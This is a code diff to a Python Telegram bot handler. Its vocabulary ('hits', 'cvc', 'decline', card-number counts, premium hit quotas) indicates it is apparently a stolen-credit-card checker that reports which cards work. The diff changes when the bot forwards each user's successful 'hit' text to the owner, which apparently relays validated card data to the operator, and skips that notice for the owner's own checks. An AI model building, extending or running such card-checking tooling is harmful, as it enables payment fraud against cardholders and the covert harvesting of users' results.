@@ -967,7 +967,8 @@ async def handle_telegram_update(session: aiohttp.ClientSession, update: dict) -
         if status_key == "success":
             if user_id and user_has_premium(user_id):
                 add_user_hits(user_id, 1)
-            await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
+            if user_id != TELEGRAM_OWNER_ID:
+                await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
         await send_telegram_message(session, chat_id, text_block)
         return
 
@@ -1048,6 +1049,8 @@ async def handle_telegram_update(session: aiohttp.ClientSession, update: dict) -
                 hits_count += 1
                 if user_id and user_has_premium(user_id):
                     add_user_hits(user_id, 1)
+                if user_id != TELEGRAM_OWNER_ID:
+                    await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
             elif status_key == "cvc":
                 ccn_count += 1
             elif status_key == "decline":
@@ -1069,8 +1072,6 @@ async def handle_telegram_update(session: aiohttp.ClientSession, update: dict) -
             if status_key in ("success", "cvc"):
                 await send_telegram_message(session, chat_id, text_block)
 
-            if status_key == "success":
-                await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
 
         # Final summary line (respecting stop)
         summary_prefix = "⏹ Stopped.\n" if stopped else ""
@@ -1107,7 +1108,8 @@ async def handle_telegram_update(session: aiohttp.ClientSession, update: dict) -
     if status_key == "success":
         if user_id and user_has_premium(user_id):
             add_user_hits(user_id, 1)
-        await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
+        if user_id != TELEGRAM_OWNER_ID:
+            await notify_owner_of_hit(session, chat_id, user_id, username, text_block)
     await send_telegram_message(session, chat_id, text_block)
 
 
